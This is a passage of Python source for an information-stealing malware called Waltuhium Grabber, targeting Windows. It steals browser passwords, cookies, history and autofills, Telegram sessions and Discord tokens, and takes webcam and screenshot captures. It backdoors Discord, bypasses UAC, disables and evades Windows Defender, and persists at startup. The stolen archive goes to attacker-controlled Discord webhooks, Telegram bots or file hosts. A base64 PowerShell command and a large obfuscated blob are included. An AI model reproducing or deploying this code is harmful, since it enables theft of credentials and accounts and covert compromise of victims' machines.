IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA=" # Unicode encoded command
            if subprocess.run(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", command], shell=True, capture_output=True, cwd= self.TempFolder).returncode == 0:
                self.ScreenshotTaken = True

    @Errors.Catch
    def BlockSites(self) -> None: # Initiates blocking of AV related sites and kill any browser instance for them to reload the hosts file
        if Settings.BlockAvSites:
            Logger.info("Blocking AV sites")
            Utility.BlockSites()
            Utility.TaskKill("chrome", "firefox", "msedge", "safari", "opera", "iexplore")
    
    @Errors.Catch
    def StealBrowserData(self) -> None: # Steal cookies, passwords and history from the browsers
        if not any((Settings.CaptureCookies, Settings.CapturePasswords, Settings.CaptureHistory or Settings.CaptureAutofills)):
            return
        
        Logger.info("Stealing browser data")

        threads: list[Thread] = []
        paths = {
            "Brave" : (os.path.join(os.getenv("localappdata"), "BraveSoftware", "Brave-Browser", "User Data"), "brave"),
            "Chrome" : (os.path.join(os.getenv("localappdata"), "Google", "Chrome", "User Data"), "chrome"),
            "Chromium" : (os.path.join(os.getenv("localappdata"), "Chromium", "User Data"), "chromium"),
            "Comodo" : (os.path.join(os.getenv("localappdata"), "Comodo", "Dragon", "User Data"), "comodo"),
            "Edge" : (os.path.join(os.getenv("localappdata"), "Microsoft", "Edge", "User Data"), "msedge"),
            "EpicPrivacy" : (os.path.join(os.getenv("localappdata"), "Epic Privacy Browser", "User Data"), "epic"),
            "Iridium" : (os.path.join(os.getenv("localappdata"), "Iridium", "User Data"), "iridium"),
            "Opera" : (os.path.join(os.getenv("appdata"), "Opera Software", "Opera Stable"), "opera"),
            "Opera GX" : (os.path.join(os.getenv("appdata"), "Opera Software", "Opera GX Stable"), "operagx"),
            "Slimjet" : (os.path.join(os.getenv("localappdata"), "Slimjet", "User Data"), "slimjet"),
            "UR" : (os.path.join(os.getenv("localappdata"), "UR Browser", "User Data"), "urbrowser"),
            "Vivaldi" : (os.path.join(os.getenv("localappdata"), "Vivaldi", "User Data"), "vivaldi"),
            "Yandex" : (os.path.join(os.getenv("localappdata"), "Yandex", "YandexBrowser", "User Data"), "yandex")
        }

        for name, item in paths.items():
            path, procname = item
            if os.path.isdir(path):
                def run(name, path):
                    try:
                        Utility.TaskKill(procname)
                        browser = Browsers.Chromium(path)
                        saveToDir = os.path.join(self.TempFolder, "Credentials", name)

                        passwords = browser.GetPasswords() if Settings.CapturePasswords else None
                        cookies = browser.GetCookies() if Settings.CaptureCookies else None
                        history = browser.GetHistory() if Settings.CaptureHistory else None
                        autofills = browser.GetAutofills() if Settings.CaptureAutofills else None

                        if passwords or cookies or history or autofills:
                            os.makedirs(saveToDir, exist_ok= True)

                            if passwords:
                                output = ["URL: {}\nUsername: {}\nPassword: {}".format(*x) for x in passwords]
                                with open(os.path.join(saveToDir, "{} Passwords.txt".format(name)), "w", errors= "ignore", encoding= "utf-8") as file:
                                    file.write(self.Separator.lstrip() + self.Separator.join(output))
                                self.PasswordsCount += len(passwords)
                            
                            if cookies:
                                output = ["{}\t{}\t{}\t{}\t{}\t{}\t{}".format(host, str(expiry != 0).upper(), cpath, str(not host.startswith(".")).upper(), expiry, cname, cookie) for host, cname, cpath, cookie, expiry in cookies]
                                with open(os.path.join(saveToDir, "{} Cookies.txt".format(name)), "w", errors= "ignore", encoding= "utf-8") as file:
                                    file.write("\n".join(output))
                                self.Cookies.extend([str(x[3]) for x in cookies])
                            
                            if history:
                                output = ["URL: {}\nTitle: {}\nVisits: {}".format(*x) for x in history]
                                with open(os.path.join(saveToDir, "{} History.txt".format(name)), "w", errors= "ignore", encoding= "utf-8") as file:
                                    file.write(self.Separator.lstrip() + self.Separator.join(output))
                                self.HistoryCount += len(history)
                            
                            if autofills:
                                output = "\n".join(autofills)
                                with open(os.path.join(saveToDir, "{} Autofills.txt".format(name)), "w", errors= "ignore", encoding= "utf-8") as file:
                                    file.write(output)
                                self.AutofillCount += len(autofills)


                    except Exception:
                        pass

                t = Thread(target= run, args= (name, path))
                t.start()
                threads.append(t)
        
        for thread in threads:
            thread.join()
        
        if Settings.CaptureGames:
            self.StealRobloxCookies()

    @Errors.Catch
    def Webshot(self) -> None: # Captures snapshot(s) from the webcam(s)
        if Settings.CaptureWebcam:
            camdir = os.path.join(self.TempFolder, "Webcam")
            os.makedirs(camdir, exist_ok= True)

            camIndex = 0
            while Syscalls.CaptureWebcam(camIndex, os.path.join(camdir, "Webcam (%d).bmp" % (camIndex + 1))):
                camIndex += 1
                self.WebcamPicturesCount += 1
            
            if self.WebcamPicturesCount == 0:
                shutil.rmtree(camdir)
    
    @Errors.Catch
    def StealTelegramSessions(self) -> None: # Steals telegram session(s) files
        if Settings.CaptureTelegram:
            Logger.info("Stealing telegram sessions")

            telegramPaths = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu("Telegram")] if x is not None])]
            multiple = len(telegramPaths) > 1
            saveToDir = os.path.join(self.TempFolder, "Messenger", "Telegram")
            
            if not telegramPaths:
                telegramPaths.append(os.path.join(os.getenv("appdata"), "Telegram Desktop"))


            for index, telegramPath in enumerate(telegramPaths):
                tDataPath = os.path.join(telegramPath, "tdata")
                loginPaths = []
                files = []
                dirs = []
                has_key_datas = False

                if os.path.isdir(tDataPath):
                    for item in os.listdir(tDataPath):
                        itempath = os.path.join(tDataPath, item)
                        if item == "key_datas":
                            has_key_datas = True
                            loginPaths.append(itempath)
                    
                        if os.path.isfile(itempath):
                            files.append(item)
                        else:
                            dirs.append(item)
                
                    for filename in files:
                        for dirname in dirs:
                            if dirname + "s" == filename:
                                loginPaths.extend([os.path.join(tDataPath, x) for x in (filename, dirname)])
            
                if has_key_datas and len(loginPaths) - 1 > 0:
                    _saveToDir = saveToDir
                    if multiple:
                        _saveToDir = os.path.join(_saveToDir, "Profile %d" % (index + 1))
                    os.makedirs(_saveToDir, exist_ok= True)

                    failed = False
                    for loginPath in loginPaths:
                        try:
                            if os.path.isfile(loginPath):
                                shutil.copy(loginPath, os.path.join(_saveToDir, os.path.basename(loginPath)))
                            else:
                                shutil.copytree(loginPath, os.path.join(_saveToDir, os.path.basename(loginPath)), dirs_exist_ok= True)
                        except Exception:
                            shutil.rmtree(_saveToDir)
                            failed = True
                            break
                    if not failed:
                        self.TelegramSessionsCount += int((len(loginPaths) - 1)/2)
            
            if self.TelegramSessionsCount and multiple:
                with open(os.path.join(saveToDir, "Info.txt"), "w") as file:
                    file.write("Multiple Telegram installations are found, so the files for each of them are put in different Profiles")
    
    @Errors.Catch
    def StealDiscordTokens(self) -> None: # Steals Discord tokens
        if Settings.CaptureDiscordTokens:
            Logger.info("Stealing discord tokens")
            output = list()
            saveToDir = os.path.join(self.TempFolder, "Messenger", "Discord")
            accounts = Discord.GetTokens()
            if accounts:
                for item in accounts:
                    USERNAME, USERID, MFA, EMAIL, PHONE, VERIFIED, NITRO, BILLING, TOKEN, GIFTS = item.values()
                    output.append("Username: {}\nUser ID: {}\nMFA enabled: {}\nEmail: {}\nPhone: {}\nVerified: {}\nNitro: {}\nBilling Method(s): {}\n\nToken: {}\n\n{}".format(USERNAME, USERID, 'Yes' if MFA else 'No', EMAIL, PHONE, 'Yes' if VERIFIED else 'No', NITRO, BILLING, TOKEN, GIFTS).strip())
                
                os.makedirs(os.path.join(self.TempFolder, "Messenger", "Discord"), exist_ok= True)
                with open(os.path.join(saveToDir, "Discord Tokens.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                    file.write(self.Separator.lstrip() + self.Separator.join(output))
                self.DiscordTokensCount += len(accounts)
        
        if Settings.DiscordInjection and not Utility.IsInStartup():
            paths = Discord.InjectJs()
            if paths is not None:
                Logger.info("Injecting backdoor into discord")
                for dir in paths:
                    appname = os.path.basename(dir)
                    Utility.TaskKill(appname)
                    for root, _, files in os.walk(dir):
                        for file in files:
                            if file.lower() == appname.lower() + '.exe':
                                time.sleep(3)
                                filepath = os.path.dirname(os.path.realpath(os.path.join(root, file)))
                                UpdateEXE = os.path.join(dir, 'Update.exe')
                                DiscordEXE = os.path.join(filepath, '{}.exe'.format(appname))
                                subprocess.Popen([UpdateEXE, '--processStart', DiscordEXE], shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
    
    def CreateArchive(self) -> tuple[str, str]: # Create archive of the data collected
        Logger.info("Creating archive")
        rarPath = os.path.join(sys._MEIPASS, "rar.exe")
        if Utility.GetSelf()[1] or os.path.isfile(rarPath):
            rarPath = os.path.join(sys._MEIPASS, "rar.exe")
            if os.path.isfile(rarPath):
                password = Settings.ArchivePassword or "waltuhium123"
                process = subprocess.run('{} a -r -hp"{}" "{}" *'.format(rarPath, password, self.ArchivePath), capture_output= True, shell= True, cwd= self.TempFolder)
                if process.returncode == 0:
                    return "rar"
        
        shutil.make_archive(self.ArchivePath.rsplit(".", 1)[0], "zip", self.TempFolder) # Creates simple unprotected zip file if the above process fails
        return "zip"
    
    def UploadToExternalService(self, path, filename= None) -> str | None: # Uploads a file to external service
        if os.path.isfile(path):
            Logger.info("Uploading %s to gofile" % (filename or "file"))
            with open(path, "rb") as file:
                fileBytes = file.read()

            if filename is None:
                filename = os.path.basename(path)
            http = PoolManager(cert_reqs="CERT_NONE")

            try:
                server = json.loads(http.request("GET", "https://api.gofile.io/getServer").data.decode(errors= "ignore"))["data"]["server"]
                if server:
                    url = json.loads(http.request("POST", "https://{}.gofile.io/uploadFile".format(server), fields= {"file" : (filename, fileBytes)}).data.decode(errors= "ignore"))["data"]["downloadPage"]
                    if url:
                        return url
            except Exception:
                try:
                    Logger.error("Failed to upload to gofile, trying to upload to anonfiles")
                    url = json.loads(http.request("POST", "https://api.anonfiles.com/upload", fields= {"file" : (filename, fileBytes)}).data.decode(errors= "ignore"))["data"]["file"]["url"]["short"]
                    return url
                except Exception:
                     Logger.error("Failed to upload to anonfiles")
                     return None
    
    def SendData(self) -> None: # Sends data to the webhook
        Logger.info("Sending data to C2")
        extention = self.CreateArchive()
        if not os.path.isfile(self.ArchivePath):
            raise FileNotFoundError("Failed to create archive")
        
        filename = "Waltuhium-%s.%s" % (os.getlogin(), extention)

        computerName = os.getenv("computername") or "Unable to get computer name"
            
        computerOS = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()
        computerOS = computerOS[2].strip() if len(computerOS) >= 2 else "Unable to detect OS"

        totalMemory = subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()
        totalMemory = (str(int(int(totalMemory[1])/1000000000)) + " GB") if len(totalMemory) >= 1 else "Unable to detect total memory"

        uuid = subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()
        uuid = uuid[1].strip() if len(uuid) >= 1 else "Unable to detect UUID"

        cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip() or "Unable to detect CPU"

        gpu = subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= 'ignore').splitlines()
        gpu = gpu[2].strip() if len(gpu) >= 2 else "Unable to detect GPU"

        productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip() or "Unable to get product key"

        http = PoolManager(cert_reqs="CERT_NONE")

        try:
            r: dict = json.loads(http.request("GET", "http://ip-api.com/json/?fields=225545").data.decode(errors= "ignore"))
            if r.get("status") != "success":
                raise Exception("Failed")
            data = f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {chr(9989) if r['mobile'] else chr(10062)}\n{'Proxy/VPN:'.ljust(20)} {chr(9989) if r['proxy'] else chr(10062)}"
            if len(r["reverse"]) != 0:
                data += f"\nReverse DNS: {r['reverse']}"
        except Exception:
            ipinfo = "(Unable to get IP info)"
        else:
            ipinfo = data

        system_info = f"Computer Name: {computerName}\nComputer OS: {computerOS}\nTotal Memory: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {gpu}\nProduct Key: {productKey}"

        collection = {
            "Discord Accounts" : self.DiscordTokensCount,
            "Passwords" : self.PasswordsCount,
            "Cookies" : len(self.Cookies),
            "History" : self.HistoryCount,
            "Autofills" : self.AutofillCount,
            "Roblox Cookies" : self.RobloxCookiesCount,
            "Telegram Sessions" : self.TelegramSessionsCount,
            "Common Files" : self.CommonFilesCount,
            "Wallets" : self.WalletsCount,
            "Wifi Passwords" : self.WifiPasswordsCount,
            "Webcam" : self.WebcamPicturesCount,
            "Minecraft Sessions" : self.MinecraftSessions,
            "Epic Session" : "Yes" if self.EpicStolen else "No",
            "Steam Session" : "Yes" if self.SteamStolen else "No",
            "Uplay Session" : "Yes" if self.UplayStolen else "No",
            "Growtopia Session" : "Yes" if self.GrowtopiaStolen else "No",
            "Screenshot" : "Yes" if self.ScreenshotTaken else "No",
            "System Info" : "Yes" if self.SystemInfoStolen else "No"
        }
        
        grabbedInfo = "\n".join([key + " : " + str(value) for key, value in collection.items()])

        match Settings.C2[0]:
            case 0: # Discord Webhook
                image_url = "https://cdn.discordapp.com/attachments/1138141791766458509/1147568738665779322/IMG_9161-removebg-preview.png"

                payload = {
                    "content": "||@everyone||" if Settings.PingMe else "",
                    "embeds": [
                        {
                            "title": "Waltuhium Grabber",
                            "description": f"**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**",
                            "url": "https://github.com/waltuhium69/Waltuhium-Grabber",
                            "color": 34303,
                            "footer": {
                                "text": "t.me/waltuhium | https://github.com/waltuhium69/Waltuhium-Grabber"
                            },
                            "thumbnail": {
                                "url": "https://cdn.discordapp.com/attachments/1138141791766458509/1147568738665779322/IMG_9161-removebg-preview.png"
                            }
                        }
                    ],
                    "username" : "waltuhium | t.me/waltuhium",
                    "avatar_url" : "https://cdn.discordapp.com/attachments/1138141791766458509/1147568738665779322/IMG_9161-removebg-preview.png"
                }

                if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20: # 20 MB
                    url = self.UploadToExternalService(self.ArchivePath, filename)
                    if url is None:
                        raise Exception("Failed to upload to external service")
                else:
                    url = None
                
                fields = dict()

                if url:
                    payload["content"] += " | Archive : %s" % url
                else:
                    fields["file"] = (filename, open(self.ArchivePath, "rb").read())
                
                fields["payload_json"] = json.dumps(payload).encode()

                http.request("POST", Settings.C2[1], fields=fields)
            
            case 1: # Telegram Bot
                payload = {
                    'caption': f'<b>Waltuhium Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 
                    'parse_mode': 'HTML'
                }

                if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 40: # 40 MB
                    url = self.UploadToExternalService(self.ArchivePath, filename)
                    if url is None:
                        raise Exception("Failed to upload to external service")
                else:
                    url = None
                
                fields = dict()

                if url:
                    payload["text"] = payload["caption"] + "\n\nArchive : %s" % url
                    method = "sendMessage"
                else:
                    fields["document"] = (filename, open(self.ArchivePath, "rb").read())
                    method = "sendDocument"
                
                token, chat_id = Settings.C2[1].split('$')
                fields.update(payload)
                fields.update({'chat_id': chat_id})
                http.request('POST', 'https://api.telegram.org/bot%s/%s' % (token, method), fields=fields)

if __name__ == "__main__" and os.name == "nt":
    Logger.info("Process started")
    if Settings.HideConsole:
        Syscalls.HideConsole() # Hides console
    
    if not Utility.IsAdmin(): # No administrator permissions
        Logger.warning("Admin privileges not available")
        if Utility.GetSelf()[1]:
            if not "--nouacbypass" in sys.argv and Settings.UacBypass:
                Logger.info("Trying to bypass UAC (Application will restart)")
                if Utility.UACbypass(): # Tries to bypass UAC (only for exe mode)
                    os._exit(0)
                else:
                    Logger.warning("Failed to bypass UAC")
                    if not Utility.IsInStartup(sys.executable):
                        logger.info("Showing UAC prompt")
                        if Utility.UACPrompt(sys.executable): # Ask user for admin perms and restart
                            os._exit(0) 
            
            if not Utility.IsInStartup() and not Settings.UacBypass:
                Logger.info("Showing UAC prompt to user (Application will restart)")
                if Utility.UACPrompt(sys.executable): # Ask user for admin perms and restart
                    os._exit(0) 
    
    Logger.info("Trying to create mutex")
    if not Syscalls.CreateMutex(Settings.Mutex): 
        Logger.info("Mutex already exists, exiting")
        os._exit(0) # If mutex already exists, exit (to prevent multiple instances from running)
    
    if Utility.GetSelf()[1]: 
        Logger.info("Trying to exclude the file from Windows defender")
        Utility.ExcludeFromDefender() # Tries to exclude from Defender (only for exe mode)

    Logger.info("Trying to disable defender")
    Utility.DisableDefender() # Tries to disable Defender

    if Utility.GetSelf()[1] and (Settings.RunBoundOnStartup or not Utility.IsInStartup()) and os.path.isfile(boundFileSrc:= os.path.join(sys._MEIPASS, "bound.waltuhium")):
        try:
            Logger.info("Trying to extract bound file")
            if os.path.isfile(boundFileDst:= os.path.join(os.getenv("temp"), "bound.exe")): # Checks if any bound file exists (only for exe mode)
                Logger.info("Old bound file found, removing it")
                os.remove(boundFileDst) # Removes any older bound file

            with open(boundFileSrc, "rb") as file:
                content = file.read()
            decrypted = zlib.decompress(content[::-1]) # Decompress the file
            with open(boundFileDst, "wb") as file: # Copies bound file to the new location
                file.write(decrypted)
            del content, decrypted
            Logger.info("Trying to exclude bound file from defender")
            Utility.ExcludeFromDefender(boundFileDst) # Tries to exclude the bound file from Defender
            Logger.info("Starting bound file")
            subprocess.Popen("start bound.exe", shell= True, cwd= os.path.dirname(boundFileDst), creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE) # Starts the bound file
        except Exception as e:
            Logger.error(e)
    
    if Utility.GetSelf()[1] and Settings.FakeError[0] and not Utility.IsInStartup(): # If not in startup, check if fake error is defined (exe mode)
        try:
            Logger.info("Showing fake error popup")
            title = Settings.FakeError[1][0].replace("\x22", "\\x22").replace("\x27", "\\x22") # Sets the title of the fake error
            message = Settings.FakeError[1][1].replace("\x22", "\\x22").replace("\x27", "\\x22") # Sets the message of the fake error
            icon = int(Settings.FakeError[1][2]) # Sets the icon of the fake error
            cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{}', 0, '{}', {}+16);close()"'''.format(message, title, Settings.FakeError[1][2]) # Shows a message box using JScript
            subprocess.Popen(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE) # Shows the fake error
        except Exception as e:
            Logger.error(e)
    
    if not Settings.Vmprotect or not VmProtect.isVM():
        if Utility.GetSelf()[1]:
            if Settings.Melt and not Utility.IsInStartup(): # If not in startup and melt option is enabled then temporarily hide the file (exe mode)
                Logger.info("Hiding the file")
                Utility.HideSelf() # Hide the file
        else:
            if Settings.Melt: # If melt mode is enabled then delete the file
                Logger.info("Deleting the file")
                Utility.DeleteSelf() # Delete the file
    
        try:
            if Utility.GetSelf()[1] and Settings.Startup and not Utility.IsInStartup(): # If startup option is enabled, and the file is not in the startup, then put it in startup
                Logger.info("Trying to put the file in startup")
                path = Utility.PutInStartup() # Put the file in startup
                if path is not None:
                    Logger.info("Excluding the file from Windows defender in startup")
                    Utility.ExcludeFromDefender(path) # Exclude the file from defender
        except Exception:
            Logger.error("Failed to put the file in startup")
        
        while True:
            try:
                Logger.info("Checking internet connection")
                if Utility.IsConnectedToInternet(): # Check if internet connection is available
                    Logger.info("Internet connection available, starting stealer (things will be running in parallel)")
                    WaltuhiumGrabber() # Start the grabber
                    Logger.info("Stealer finished its work")
                    break
                else:
                    Logger.info("Internet connection not found, retrying in 10 seconds")
                    time.sleep(10) # Wait for 10 seconds and check the internet connection again
            except Exception as e:
                if isinstance(e, KeyboardInterrupt): # If the user pressed CTRL+C then exit
                    os._exit(1)
                Logger.critical(e, exc_info= True) # Print the error message
                Logger.info("There was an error, retrying after 10 minutes")
                time.sleep(600) # Wait for 10 minutes and try again
        
        if Utility.GetSelf()[1] and Settings.Melt and not Utility.IsInStartup(): # Delete the file if melt option is enabled and the file is not in the startup (exe mode)
            Logger.info("Deleting the file")
            Utility.DeleteSelf() # Delete the current file

        #pip install pycryptodome  , It works only v3.11 Above.
import random ,base64,codecs,zlib;pyobfuscate=""

obfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(private_key)'],['''br-qA_QxRzBkFx;giYxe9*+OCn@Bnh9(tQ2z5S_YRC$pn&KrwDRKp_-E3`!Ea4-&$gL{f-C9GK@H(rLCbrqoelq}BQ{xsY@3dQF?U8<yL&3@Z+%#-}`Z1RrPe?u+CX3{?LJCN@D=EgmbGj4KjBtZCH$GNiiHs5!l!If%7L2ZcDfbjB-(d0aL7G%5PVP6r-X4~lKYoQ{>LzFZn8Z>^7EZs5Vx2+6Xq;;#(zZjMVHrtYgfT!rrU4FF1aR42SzE4f*s@Vj5NEH!;rAqo08;8WFRP*{#Y?IY^D$Ad1!R6)4F3;#{#|8|S_%b+TF)vJ!f$#4Zi-mTlg`J{<!c1Ko2?fpe;?7sQxghpi=exYgJ4^R#M}7#F3})#*^)JQZmTroOWxqoLUz6~rkJ%1vB9W}dOQYj@SFLG+)VDH-$sPvl(ru40w6_pY%B`crPTV?E4zkt^^n{*GZbDzD^)NZ(mOWWPm+{ChZHo&}h@%xp+~l~bRa$p=|I{_(b%m8&?DvnF*%{j?LZ?+*VRD}IolPuu5bX7j=r-C}?f6swrxU5lB`f&&y%F-RmPvx&$p}UKh5X(EX7uS?<Jdh%1F$*<DfG|#D8Nwjn6EB3nkn0C^z-jpsN`Sq7R#P0X~u3@20J7B<bAZ*xrii9tF+B;oAStyndubGk(u3?LU0MHJ2t3yvCDlr$bu?_7$(=*E!U1CpIckQ<O2|Xtbm8&#4u$p#D$87Yju9e`3^h`<jBAuyX(2R%yBsecvLg8eIzHeH1?5(n6$37DdB&g+@r0ing_B}4P`;&`}y(ztcbwwk-~if*Dby{v(p~X{VmlUpVJ_c2&cW%7zACt3k;b72*o*VL)C7}h+O0I!czb~egfcR<SOKUQpCgI%JLD4qi*jM8h-_5lPR35@j0fB`Qvs4U|>^@Pfd?6cPvtwu3&+}{$<S)k^6axPrvQ?t4k3NXn^NBrDqrJOIMTYgyZcEgV#`jqM5KsN!C&O#S5r!J53Qo?xhd>%#JOJqJcy*2XtWUUOsM|`jqum6)`Sg6R%TtT|tT0Qd{;^y3MkPLj*X#sRAeT)2EXqf7A)zMk@{(89%-Z_kj$kRZ`y2zkClBZXvRdwAyp<iIxjM$wb-zrSUx|4k|&heTHWkUivX6Nkmh&Lj&3lThVidW!He!^jo397)hnDePb$Lw9`rSdJ2b{vdPSK)hR1u@R6p&4ps7NyY!?fiK7Why68G;{nqnqIzavlwKWDGhlLVBut&9^l3LYHzlEI`{v)#+RSo_~SC0DHzQNZr+kVN>$*LTrnKCF_ZMvDdf6>n!99NK#Wre{qP5q_`00|^jX7wAJP{!dd_ZAXc;bCGQ=UcZU79y^e=$%^#;<$}Sr4T3Pkv^D$9+OJx-b93Mud&4m514NAqT9&sz}(79`g8rU5j|>W<EbROLidSzcDv;7rx^sgew>o``d8sY-=61@I7o}pl<*bV(#NF~uwDAN{HFG{3*5lBIpV2+#=oR@G<k8LkWAh$UasV$>+>D5u**E9{sai}ZMe|k!9Q<d^?Y6k9QVL6xKlG4m&lhm8$6P}efhgyQy5pbG3yEh5!B5wK6PMqP_ld-v0BW2vMqs}Tx8A$;tkzTHTKm>n6MZ+fGcMaDYa@w%|PmI8D>4YGpGdD%T*&7+}{1VH5^{stE5WrL=u8N=@)H!i;p>_@=~Y01BI7gTtYaPYt)?IRL!mv#;{X8>@(z_h_4fm$a(1lhA^hbFfrA5O9L`obaFOo9|cBRIWDO;ZgW%!_qM7{JcWn22Sr-#qbRWEmybGaKLcEdk8<@S)KB=Xyt&@Zq1e^IbwI@_{~gFJ!ayHbE(A4BP-b&DZPXS107Vb-H7*TQy~)!ThqwXrqUGe`YB%YMMa-XaEq_<`1%^BY-JTS=db!5a@i3$dBXTe0a8YjC&!*s|+9spjuoO@%VC+u0?aMI5?4J8D2oECN#I7X*!gE%#`fOgn0k;<E-!KXa%6sKZE4#RZYa9#wmXP41u5{jQZ+ldM!L?e`ow!rLaE=IyzA7t^F8ouR^W8VacBT1R@gy2EB|Cg?BJ68*$CaF2yRRi3E-Rv&l=N29@}C=7(wkOl1oi_^?b66cpSOOT>uER_g0Y%olUOcF_|%UX)SYpM+>HKd)PoH;hj?GEX&+LD0HaQjFLXfcrz5JvW5?|adUBZ9TGe%os*-^aD2QpF#@E=jcP&{|y&ojb`HUM|<#a#5P^^;TqHPv6xUTR5Zt)?@$74E&ehQut4ZGyK(Q3Wi^J(YoP=vq_bJ6etf`2rFruaW;0`|@vu4v~dfSNKyd$&LbW|nJet-njnRx>G%)4#{LKXl!p!v@Lz%MJ1sRf&7p*v|_ciItgd_FO9fa-W5<hq?A3%EYNh*bmBU8jM$8O?%TtZY8!EhY_or5N|9$n1liDJw47fl1-%p=NcCG-Xbou$yN`h5&a#?7cOciTVNkPDqxTPmPj7p4m(!kNA4nc*6_AL!HY)^7voL2fSr3H=Tmat=m0T2g)h~x*>pDo`J2k3ge6anLZ`SAHv6Aj40x!$TH@a#YHbklIP$$ypw)m>qOijGpj?i-pebvMy4~YNWs;_G*ETNaSF#FD&Lgw4>D>!^(Fcw~J9RUS#5`>o4lkrE=yqlqltpFe+iYN>&-=1~*RT1~`?;z_SG<cJb7}`^|8{mH5<Q1SzF_&9aUwtoA$?U*fF2Ujl7vZyZ`y6W+2;v=kE7MzbKT#lSN?6>YKimR4c!8*PRhF1cJ#D8rZd3GCMclgVEbz>noJ8qc-HAt_!&dLGCT;<KhA<GXvEKblUCV=FJunOOOjBZ6d)xCx3fONED$%<=e!^`NB9f(zeq=osJju+EAr?-=@2*ABt#xW2*_T1f4s|Wgj`*=9b-LHbFBjK?RU>cUSxatmyYddA)!P+jNNZ^bpB?VJJ!vko7v~H9FU4kY=4PQWRD=NQy**Qz+lDPTswl2`>tk~MILl>==+P&)&f7Rd`>N<YLbfx%RZYYAf+;GYUi@X7iI;jc*f2KrSBr}DU)K_k@?@ihylWFVe-m96|0evodw6WYTJ>my$lv+<Hvw5z-VM-!fotVMSMM3!_Za(g&^E+U}Aa9sHIB2T@)vfOB6=v-_MaUf|jAlC56)_M5h1YhmaORV*=Xb8(o;}O=boExXa{Mqo7+6i(#^4#UAa(@~Ty_#0cnk2I`{3Tl01KZJf-Pvqr)gcU~$@!Qz{Q<%VDGKgSiTQd^m5ogVxP-N^`Sbk)*YkstZh3RyRfG*k`mT;J*;L*1H=S;Tu180EpLI_;maycezdhd_}@_9)%Jimn)y$QMbhX=wZo3sq&w3~MqWR>8ui;iOCf6J3SDNYZC!?Gfl#lm_RE2y&;1?DoQoyu~-%FED;QO5`J>cVC61&sX1!!FPJmW$(c8G3VpLQ^qn|IBOk=?J19EKk2^qeTc2XYURd<9Z*A6_^H>BafP_C+)wX*U%2cW_*0)d7B!u{b!XI`^FnU^Al;6Y=UsAKOKYUO8RG^o3Od29M^BOs%pOE|cgn59A7RwG4MTb9E(>ddIG?q+LrRlY+xldP?+gek@>VR-OAkE`M1iOg&ZPi9qsGaTE*Ge=Z4l?_glhu59!~Hz?@|1vI%708Jr%o(6tadc*=i+)$on79BTBAOA|